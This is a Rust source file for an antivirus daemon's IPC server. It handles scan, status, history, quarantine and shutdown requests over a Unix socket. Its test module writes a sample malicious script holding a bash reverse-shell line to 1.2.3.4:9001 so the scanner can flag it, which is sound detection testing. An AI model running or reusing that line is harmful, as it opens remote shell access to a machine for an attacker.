//! The Unix-socket IPC server: accepts client connections and dispatches
//! [`Request`]s against the shared [`DaemonState`].

use crate::state::DaemonState;
use aegis_ipc::codec;
use aegis_ipc::protocol::*;
use std::path::Path;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use tokio::net::{UnixListener, UnixStream};
use tokio::sync::Notify;

/// Bind the control socket, removing any stale socket file first.
pub fn bind(socket: &Path) -> std::io::Result<UnixListener> {
    if socket.exists() {
        // A previous run may have left a stale socket; clean it up.
        let _ = std::fs::remove_file(socket);
    }
    if let Some(parent) = socket.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let listener = UnixListener::bind(socket)?;
    // Restrict the socket to the owner.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(socket, std::fs::Permissions::from_mode(0o600));
    }
    Ok(listener)
}

/// Accept connections until `shutdown` is notified.
pub async fn serve(listener: UnixListener, state: Arc<DaemonState>, shutdown: Arc<Notify>) {
    loop {
        tokio::select! {
            _ = shutdown.notified() => {
                tracing::info!("IPC server shutting down");
                break;
            }
            accepted = listener.accept() => {
                match accepted {
                    Ok((stream, _addr)) => {
                        let state = state.clone();
                        let shutdown = shutdown.clone();
                        tokio::spawn(async move {
                            if let Err(e) = handle_conn(stream, state, shutdown).await {
                                tracing::debug!(error = %e, "client connection ended");
                            }
                        });
                    }
                    Err(e) => tracing::warn!(error = %e, "accept failed"),
                }
            }
        }
    }
}

async fn handle_conn(
    mut stream: UnixStream,
    state: Arc<DaemonState>,
    shutdown: Arc<Notify>,
) -> Result<(), codec::CodecError> {
    // One request/response per connection keeps the protocol trivial and robust.
    let req: Request = codec::read_frame(&mut stream).await?;
    tracing::debug!(?req, "ipc request");
    let resp = dispatch(req, &state, &shutdown).await;
    codec::write_frame(&mut stream, &resp).await?;
    Ok(())
}

async fn dispatch(req: Request, state: &Arc<DaemonState>, shutdown: &Arc<Notify>) -> Response {
    match req {
        Request::Ping => Response::Pong {
            version: PROTOCOL_VERSION,
        },

        Request::Status => Response::Status(build_status(state)),

        Request::Scan { path, kind } => {
            let state = state.clone();
            let result = tokio::task::spawn_blocking(move || {
                let scanner = state.scanner();
                let (stats, verdicts) = scanner.scan(&path);
                state.incr_scans(stats.threats);
                // Persist history.
                let repo = state.db.scans();
                if let Ok(scan_id) = repo.insert_scan(
                    now(),
                    now(),
                    &path.to_string_lossy(),
                    stats.scanned as i64,
                    stats.threats as i64,
                    &kind,
                ) {
                    for v in verdicts.iter().filter(|v| v.is_threat()) {
                        for d in &v.detections {
                            let _ = repo.insert_threat(
                                scan_id,
                                now(),
                                &v.path.to_string_lossy(),
                                &v.sha256,
                                &d.threat,
                                &d.engine,
                                d.severity as i64,
                                "detected",
                            );
                        }
                    }
                }
                (path, stats, verdicts)
            })
            .await;
            match result {
                Ok((target, stats, verdicts)) => {
                    let threats = verdicts
                        .iter()
                        .filter(|v| v.is_threat())
                        .map(|v| ThreatBrief {
                            path: v.path.clone(),
                            sha256: v.sha256.clone(),
                            severity: v.severity(),
                            names: v.threat_names(),
                            engines: v
                                .detections
                                .iter()
                                .map(|d| d.engine.as_str())
                                .collect::<std::collections::BTreeSet<_>>()
                                .into_iter()
                                .collect::<Vec<_>>()
                                .join(", "),
                        })
                        .collect();
                    Response::ScanResult(ScanSummary {
                        target,
                        stats,
                        threats,
                    })
                }
                Err(e) => Response::Error {
                    message: format!("scan task failed: {e}"),
                },
            }
        }

        Request::History { limit } => match state.db.scans().recent(limit) {
            Ok(rows) => Response::History(
                rows.into_iter()
                    .map(|r| HistoryEntry {
                        finished: r.finished,
                        target: r.target,
                        files_scanned: r.files_scanned,
                        threats: r.threats,
                        kind: r.kind,
                    })
                    .collect(),
            ),
            Err(e) => Response::Error {
                message: e.to_string(),
            },
        },

        Request::QuarantineList => match state.db.quarantine().all() {
            Ok(items) => Response::Quarantine(
                items
                    .into_iter()
                    .map(|q| QuarantineEntry {
                        sha256: q.sha256,
                        original_path: q.original_path,
                        threat: q.threat,
                        quarantined_at: q.quarantined_at,
                        size: q.size,
                    })
                    .collect(),
            ),
            Err(e) => Response::Error {
                message: e.to_string(),
            },
        },

        Request::RealtimeStatus => Response::Realtime(build_status(state).realtime),

        Request::ReloadConfig => {
            state.reload();
            Response::Ok {
                message: "configuration reloaded".into(),
            }
        }

        Request::Shutdown => {
            shutdown.notify_waiters();
            Response::Ok {
                message: "daemon shutting down".into(),
            }
        }
    }
}

fn build_status(state: &Arc<DaemonState>) -> DaemonStatus {
    let cfg = state.config_snapshot();
    let engines = state
        .engine_infos()
        .into_iter()
        .map(|(name, status)| EngineInfo { name, status })
        .collect();
    DaemonStatus {
        version: env!("CARGO_PKG_VERSION").to_string(),
        protocol: PROTOCOL_VERSION,
        pid: std::process::id(),
        uptime_secs: state.uptime_secs(),
        engines,
        realtime: RealtimeStatus {
            enabled: cfg.realtime.enabled,
            backend: cfg.realtime.backend.clone(),
            watched_paths: cfg.realtime.paths.clone(),
            events_seen: state.rt_events.load(Ordering::Relaxed),
            threats_blocked: state.rt_blocked.load(Ordering::Relaxed),
            error: None,
        },
        scans_run: state.scans_run.load(Ordering::Relaxed),
        threats_found: state.threats_found.load(Ordering::Relaxed),
    }
}

fn now() -> i64 {
    aegis_core::now_epoch()
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_core::{Config, Whitelist};
    use aegis_ipc::Client;
    use aegis_storage::Database;

    #[tokio::test]
    async fn ipc_ping_status_and_scan_over_real_socket() {
        let tmp = tempfile::tempdir().unwrap();
        let socket = tmp.path().join("aegisd.sock");

        // A malicious file the daemon should flag when asked to scan it.
        let victim = tmp.path().join("evil.sh");
        std::fs::write(
            &victim,
            b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
        )
        .unwrap();

        let db = Arc::new(Database::open_in_memory().unwrap());
        let state = DaemonState::new(Config::default(), Whitelist::default(), db);
        let listener = bind(&socket).unwrap();
        let shutdown = Arc::new(Notify::new());
        let server = tokio::spawn(serve(listener, state, shutdown.clone()));

        let client = Client::with_socket(&socket);

        // Ping → Pong
        assert!(client.is_running().await);

        // Status → engines listed
        match client.request(&Request::Status).await.unwrap() {
            Response::Status(s) => assert!(!s.engines.is_empty()),
            other => panic!("unexpected: {other:?}"),
        }

        // Scan → one threat found
        match client
            .request(&Request::Scan {
                path: victim.clone(),
                kind: "test".into(),
            })
            .await
            .unwrap()
        {
            Response::ScanResult(sum) => {
                assert_eq!(sum.stats.threats, 1);
                assert_eq!(sum.threats.len(), 1);
            }
            other => panic!("unexpected: {other:?}"),
        }

        // Shutdown cleanly.
        let _ = client.request(&Request::Shutdown).await.unwrap();
        let _ = tokio::time::timeout(std::time::Duration::from_secs(2), server).await;
    }
}
